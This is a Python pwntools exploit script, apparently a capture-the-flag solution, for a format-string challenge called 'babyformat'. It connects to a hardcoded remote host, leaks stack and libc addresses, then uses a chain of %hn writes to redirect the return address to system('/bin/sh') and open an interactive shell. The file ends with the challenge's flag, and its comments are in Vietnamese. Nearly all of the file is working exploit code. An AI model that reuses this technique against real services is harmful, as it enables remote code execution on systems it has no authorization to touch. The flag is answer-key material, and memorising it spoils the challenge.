from pwn import *
import time
import sys
from hashlib import sha256
import os

def babyformat(DEBUG):
	if DEBUG=="1":
		offset_libc_start_main = 0x018637
		offset_system = 0x03ada0
		offset_binsh = 0x15ba0b
		r = process("./babyformat")
		raw_input("debug?")
	elif DEBUG=="2":
		offset_libc_start_main = 0x018e81
		offset_system = 0x03cd10
		offset_binsh = 0x17b8cf
		HOST = "104.196.99.62"
		PORT = 2222
		r = remote(HOST,PORT)
	
	
	r.recvuntil("system ====\n")
	payload = "%9$p%15$p" 						#leak stack, libc 
	r.sendline(payload)
	stack_leak = int(r.recv(10),16)
	libc_start_main = int(r.recv(10),16)
	r.recv()									# recv het so output con lai
	
	stack_var_i = stack_leak - 0xb8
	stack_binsh = stack_leak - 0x90				# stack binsh
	ret_main = stack_leak - 0x98				# ret main addr
	libc_base = libc_start_main - offset_libc_start_main
	system = libc_base + offset_system
	binsh = libc_base + offset_binsh
	log.info("libc_start_main: %#x" % libc_start_main)
	log.info("libc_base: %#x" % libc_base) 
	log.info("system: %#x" % system)
	log.info("binsh: %#x" % binsh)
	log.info("stack_var_i: %#x" % stack_var_i)
	log.info("stack_binsh: %#x" % stack_binsh)
	log.info("stack_leak: %#x" % stack_leak)
	payload = "%"								#ghi stack tro toi stack_var_i
	payload += str(int(hex(stack_var_i+0x2)[6:],16))
	payload +="x"
	payload += "%9$hn"
	payload = payload.ljust(12, 'z')
	r.sendline(payload)
	
	payload = "%"
	payload += "65535"
	payload += "x%57$hn"						#thay doi value stack_var_i RESET i = 0xffff0000
	payload = payload.ljust(13, 'z')
	r.sendline(payload)
	
	payload = 'z'
	payload = payload.ljust(11, 'z')							#bo ki tu \n du
	r.sendline(payload)
	
	payload = "%"								#ghi stack tro toi stack chua binsh
	payload += str(int(hex(stack_binsh+0x2)[6:],16))		
	payload += "x%9$hn"							#ghi 2 byte cao	
	payload = payload.ljust(12, 'z')
	r.sendline(payload)	
	
	payload = "%"								#ghi value binsh vao 2 byte cao
	payload += str(int(hex(binsh)[2:6],16))		
	payload +="x"
	payload += "%57$hn"
	payload = payload.ljust(13, 'z')
	r.sendline(payload)
	
	payload = 'z'
	payload = payload.ljust(11, 'z')						
	r.sendline(payload)							#bo ki tu \n du
	
	payload = "%"								#ghi stack tro toi stack chua binsh
	payload += str(int(hex(stack_binsh)[6:],16))	
	payload += "x%9$hn"							#ghi 2 byte thap
	payload = payload.ljust(12, 'z')
	r.sendline(payload)	
	
	payload = "%"								#ghi value binsh vao 2 byte thap
	payload += str(int(hex(binsh)[6:],16))		
	payload +="x"
	payload += "%57$hn"
	payload = payload.ljust(13, 'z')
	r.sendline(payload)
	
	payload = 'z'
	payload = payload.ljust(11, 'z')							
	r.sendline(payload)							#bo ki tu \n du
	
	# payload = "%13$p"
	# r.sendline(payload)
	# print r.recv().encode("hex")
	payload = "%"								#ghi stack tro toi stack ret main
	payload += str(int(hex(ret_main+0x2)[6:],16))	
	payload += "x%9$hn"							#ghi 2 byte cao cua stack
	payload = payload.ljust(12, 'z')
	r.sendline(payload)	
	
	payload = "%"								#ghi 1 bytes value system
	payload += str(int(hex(system)[2:6],16))		
	payload +="x"
	payload += "%57$hn"
	payload = payload.ljust(13, 'z')
	r.sendline(payload)
	
	payload = 'z'
	payload = payload.ljust(11, 'z')							
	r.sendline(payload)		
	
	payload = "%"								#ghi stack tro toi stack ret main
	payload += str(int(hex(ret_main)[6:],16))		
	payload += "x%9$hn"							#ghi 2 byte thap
	payload = payload.ljust(12, 'z')
	r.sendline(payload)	
	
	payload = "%"								#ghi value system vao 2 byte thap
	payload += str(int(hex(system)[6:],16))		
	payload +="x"
	payload += "%57$hn"
	payload = payload.ljust(13, 'z')
	r.sendline(payload)
	
	payload = 'z'
	payload = payload.ljust(11, 'z')							
	r.sendline(payload)	
	
	payload = "EXIT"
	r.sendline(payload)
	
	r.interactive()
babyformat(sys.argv[1])

#ISITDTU{044b7e07f7da9990e7f2dc1ab28f9b07}